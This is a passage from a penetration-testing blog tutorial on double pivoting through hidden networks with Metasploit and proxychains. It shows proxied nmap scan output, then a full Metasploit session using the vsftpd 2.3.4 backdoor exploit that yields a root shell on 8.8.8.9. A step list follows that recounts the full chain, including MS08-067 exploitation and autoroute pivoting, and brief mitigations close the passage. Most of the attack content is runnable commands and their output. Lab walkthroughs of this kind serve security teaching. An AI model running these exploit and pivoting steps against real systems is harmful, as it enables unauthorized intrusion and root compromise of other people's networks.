|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)
NSE: Script scanning 8.8.8.9.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:54
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed NSE at 05:54, 1.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Nmap scan report for 8.8.8.9
Host is up, received user-set (0.41s latency).
Scanned 
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.3.4
22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open  telnet  syn-ack Linux telnetd
80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
root@kali:~#</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
NSE: Loaded 36 scripts for scanning.
Initiating Connect Scan
Scanning 8.8.8.9 [4 ports]
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
Discovered open port 21/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
Discovered open port 23/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
Discovered open port 22/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Discovered open port 80/tcp on 8.8.8.9
Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)
Initiating Service scan at 05:54
Scanning 4 services on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)
NSE: Script scanning 8.8.8.9.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:54
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed NSE at 05:54, 1.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Nmap scan report for 8.8.8.9
Host is up, received user-set (0.41s latency).
Scanned 
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.3.4
22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open  telnet  syn-ack Linux telnetd
80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
root@kali:~#</pre>
<p>As you can see, the packages goes through the first proxy server, then the second proxy server we have defined. Finally, it reaches its destination.</p>
<p><span style="line-height: 1.5">When the scan result is analyzed, it will be determined that a <a href="https://www.exploit-db.com/exploits/17491/">vulnerable</a> version of the <strong>vsftpd</strong> service is installed on 8.8.8.9.</span></p>
<p>The following steps are taken to prepare the vsftpd exploit module in the Metasploit Framework and to compromise out final&nbsp;target:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use exploit/unix/ftp/vsftpd_234_backdoor </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">vsftpd_234_backdoor</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">exploit/unix/ftp/vsftpd_234_backdoor</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name   Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----   ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   RHOST                   yes       The target address</span></div></div><div class=""><div><span class="enlighter-text">   RPORT  </span><span class="enlighter-n1">21</span><span class="enlighter-text">               yes       The target port</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Exploit target:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Id  Name</span></div></div><div class=""><div><span class="enlighter-text">   --  ----</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">0</span><span class="enlighter-text">   Automatic</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">vsftpd_234_backdoor</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set rhost </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">rhost =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">vsftpd_234_backdoor</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text"> - Banner: </span><span class="enlighter-m0">220</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">vsFTPd </span><span class="enlighter-n0">2.3</span><span class="enlighter-text">.</span><span class="enlighter-m3">4</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text"> - USER: </span><span class="enlighter-n1">331</span><span class="enlighter-text"> Please specify the password.</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text"> - Backdoor service has been spawned, handling...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text"> - UID: uid=</span><span class="enlighter-m0">0</span><span class="enlighter-g1">(</span><span class="enlighter-text">root</span><span class="enlighter-g1">)</span><span class="enlighter-text"> gid=</span><span class="enlighter-m0">0</span><span class="enlighter-g1">(</span><span class="enlighter-text">root</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Found shell.</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Command shell session </span><span class="enlighter-n1">4</span><span class="enlighter-text"> </span><span class="enlighter-m0">opened</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Local Pipe -</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Remote Pipe</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">pwd</span></div></div><div class=""><div><span class="enlighter-text">/</span></div></div><div class=""><div><span class="enlighter-text">id</span></div></div><div class=""><div><span class="enlighter-text">uid=</span><span class="enlighter-m0">0</span><span class="enlighter-g1">(</span><span class="enlighter-text">root</span><span class="enlighter-g1">)</span><span class="enlighter-text"> gid=</span><span class="enlighter-m0">0</span><span class="enlighter-g1">(</span><span class="enlighter-text">root</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ifconfig</span></div></div><div class=""><div><span class="enlighter-text">eth0      Link encap:Ethernet  HWaddr </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">56</span><span class="enlighter-text">:f1:7c  </span></div></div><div class=""><div><span class="enlighter-text">          inet addr:</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">  Bcast:</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.255</span><span class="enlighter-text">  Mask:</span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          inet6 addr: fe80::a00:27ff:fe56:f17c/</span><span class="enlighter-n1">64</span><span class="enlighter-text"> Scope:Link</span></div></div><div class=""><div><span class="enlighter-text">          UP BROADCAST RUNNING MULTICAST  MTU:</span><span class="enlighter-n1">1500</span><span class="enlighter-text">  Metric:</span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          RX packets:</span><span class="enlighter-n1">10843</span><span class="enlighter-text"> errors:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> dropped:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> overruns:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> frame:</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          TX packets:</span><span class="enlighter-n1">2779</span><span class="enlighter-text"> errors:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> dropped:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> overruns:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> carrier:</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          collisions:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> txqueuelen:</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text">          RX bytes:</span><span class="enlighter-m0">1081842</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">1.0</span><span class="enlighter-text"> MB</span><span class="enlighter-g1">)</span><span class="enlighter-text">  TX bytes:</span><span class="enlighter-m0">661455</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">645.9</span><span class="enlighter-text"> KB</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          Base address:</span><span class="enlighter-n2">0xd010</span><span class="enlighter-text"> Memory:f0000000-f0020000 </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">lo        Link encap:Local Loopback  </span></div></div><div class=""><div><span class="enlighter-text">          inet addr:</span><span class="enlighter-n0">127.0</span><span class="enlighter-text">.</span><span class="enlighter-n0">0.1</span><span class="enlighter-text">  Mask:</span><span class="enlighter-n0">255.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          inet6 addr: ::</span><span class="enlighter-n1">1</span><span class="enlighter-text">/</span><span class="enlighter-n1">128</span><span class="enlighter-text"> Scope:Host</span></div></div><div class=""><div><span class="enlighter-text">          UP LOOPBACK RUNNING  MTU:</span><span class="enlighter-n1">16436</span><span class="enlighter-text">  Metric:</span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          RX packets:</span><span class="enlighter-n1">18161</span><span class="enlighter-text"> errors:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> dropped:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> overruns:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> frame:</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          TX packets:</span><span class="enlighter-n1">18161</span><span class="enlighter-text"> errors:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> dropped:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> overruns:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> carrier:</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          collisions:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> txqueuelen:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text">          RX bytes:</span><span class="enlighter-m0">5307479</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">5.0</span><span class="enlighter-text"> MB</span><span class="enlighter-g1">)</span><span class="enlighter-text">  TX bytes:</span><span class="enlighter-m0">5307479</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">5.0</span><span class="enlighter-text"> MB</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">msf &gt; 

msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor 

msf exploit(vsftpd_234_backdoor) &gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



msf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9
rhost =&gt; 8.8.8.9

msf exploit(vsftpd_234_backdoor) &gt; run

[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 8.8.8.9:21 - USER: 331 Please specify the password.
[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe) 

pwd
/
id
uid=0(root) gid=0(root)
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)
          Base address:0xd010 Memory:f0000000-f0020000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">msf &gt; 

msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor 

msf exploit(vsftpd_234_backdoor) &gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



msf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9
rhost =&gt; 8.8.8.9

msf exploit(vsftpd_234_backdoor) &gt; run

[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 8.8.8.9:21 - USER: 331 Please specify the password.
[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe) 

pwd
/
id
uid=0(root) gid=0(root)
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)
          Base address:0xd010 Memory:f0000000-f0020000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)
</pre>
<h3>In Conclusion</h3>
<p>The attacker discovered 2 different secret networks by following the steps below.</p>
<ol>
<li>Attacked got&nbsp;an access to the RD machine which &nbsp;was on same network with attacker.</li>
<li>And then he realise that RD machine has 2 network interface.</li>
<li>He defined an routing rule by using <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">autoroute</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">autoroute</code> post module.</li>
<li>And then attacker performed &nbsp;ARP and NMAP&nbsp;scanning on <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">7.7.7.</span><span class="enlighter-n1">0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">7.7.7.0/24</code> network and found machine named as JC.</li>
<li>JC had a two different vulnerability.&nbsp;<div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">Easy File Share</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">Easy File Share</code> and <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">MS08-</span><span class="enlighter-n1">067</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">MS08-067</code>.</li>
<li>Successfully exploitation of MS08-067 allowed attacker to gain an access to the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">7.7.7.</span><span class="enlighter-n1">20</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">7.7.7.20</code></li>
<li>Information gathering showed JC also have 2 network interface.</li>
<li>Another routing rule defined on <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">7.7.7.</span><span class="enlighter-n1">20</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">7.7.7.20</code>.</li>
<li>ARP and NMAP was used&nbsp;on <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">8.8.8.</span><span class="enlighter-n1">0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">8.8.8.0/24</code>.</li>
<li>Vulnerable vsftp was running on <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-shell "><span class="enlighter"><span class="enlighter-text">8.8.8.</span><span class="enlighter-n1">9</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="shell">8.8.8.9</code> machine named as SK.</li>
<li>Final.</li>
</ol>
<h3><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-577" src="https://pentest.blog/wp-content/uploads/final.png" alt="" width="932" height="321" srcset="https://pentest.blog/wp-content/uploads/final.png 932w, https://pentest.blog/wp-content/uploads/final-300x103.png 300w, https://pentest.blog/wp-content/uploads/final-768x265.png 768w" sizes="(max-width: 932px) 100vw, 932px"></h3>
<p>While the attacker’s system could only gain access to the first network he was on, he could also gain access to 2 hidden networks as a result of the attacks.</p>
<h3>… and Video Ofcourse</h3>
<p>For the people who couldn’t follow this article. We have a video that shows all instructions together 🙂</p>
<p><iframe loading="lazy" title="Pentest blog - Explore Hidden Networks with Double Pivoting" width="648" height="365" src="https://www.youtube.com/embed/awLMbwj5iP0?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<h3>Mitigations</h3>
<ul>
<li>Systems that contain multiple NICs and provide DMZ access should be removed from the existing network structure.</li>
<li>Systems in the DMZ structure should only be accessed over DMZ structures.</li>
</ul>
<h4>References</h4>
<p>http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html<br>
https://www.sans.org/reading-room/whitepapers/testing/post-exploitation-metasploit-pivot-port-33909<br>
https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/</p>
</div>
<footer class="entry-meta">

<div class="tagcloud">
<a href="https://pentest.blog/tag/metasploit/">metasploit</a> <a href="https://pentest.blog/tag/pivoting/">pivoting</a> <a href="https://pentest.blog/tag/routing/">routing</a> <a href="https://pentest.blog/tag/windows/">windows</a>
</div>

</footer>
</div>
<div class="post-inner-content secondary-content-box">

<div class="author-bio content-box-inner">

<div class="avatar">
<img alt="" src="https://secure.gravatar.com/avatar/f0bd5ac850edf911127a8b84c8dc2b73?s=60&amp;d=monsterid&amp;r=g" srcset="https://secure.gravatar.com/avatar/f0bd5ac850edf911127a8b84c8dc2b73?s=120&amp;d=monsterid&amp;r=g 2x" class="avatar avatar-60 photo" height="60" width="60" loading="lazy" decoding="async"> </div>


<div class="author-bio-content">
<h4 class="author-name"><a href="https://pentest.blog/author/mucahit-karadag/">Mucahit Karadag</a></h4>
<p class="author-description">
Pentest Ninja @ PRODAFT / Invictus Europe </p>
</div>
</div>
</div>
</article>
<div id="disqus_thread"><iframe id="dsq-app8981" name="dsq-app8981" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" style="width: 1px !important; min-width: 100% !important; border: medium !important; overflow: hidden !important; height: 0px !important;" width="100%" src="https://disqus.com/embed/comments/?base=default&amp;f=pentestblog&amp;t_i=462%20https%3A%2F%2Fpentest.blog%2F%3Fp%3D462&amp;t_u=https%3A%2F%2Fpentest.blog%2Fexplore-hidden-networks-with-double-pivoting%2F&amp;t_e=Explore%20Hidden%20Networks%20With%20Double%20Pivoting&amp;t_d=Explore%20Hidden%20Networks%20With%20Double%20Pivoting&amp;t_t=Explore%20Hidden%20Networks%20With%20Double%20Pivoting&amp;s_o=default#version=e065c38d8d710d0212e992dcc1c69682"></iframe></div>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/" rel="prev"><i class="fa fa-chevron-left"></i> <span class="post-title">What is LLMNR &amp; WPAD and How to Abuse Them During Pentest ?</span></a></div><div class="nav-next"><a href="https://pentest.blog/data-ex-filtration-with-dns-in-sqli-attacks/" rel="next"><span class="post-title">Data Exfiltration with DNS in SQLi attacks <i class="fa fa-chevron-right"></i></span></a></div></div>
</nav>
</main>
</div>
</div>
<div id="secondary" class="widget-area col-sm-12 col-md-4" role="complementary">
<div class="well">
<aside id="search-2" class="widget widget_search">
<form role="search" method="get" class="form-search" action="https://pentest.blog/">
<div class="input-group">
<label class="screen-reader-text" for="s">Search for:</label>
<input type="text" class="form-control search-query" placeholder="Search…" value="" name="s" title="Search for:">
<span class="input-group-btn">
<button type="submit" class="btn btn-default" name="submit" id="searchsubmit" value="Search"><span class="glyphicon glyphicon-search"></span></button>
</span>
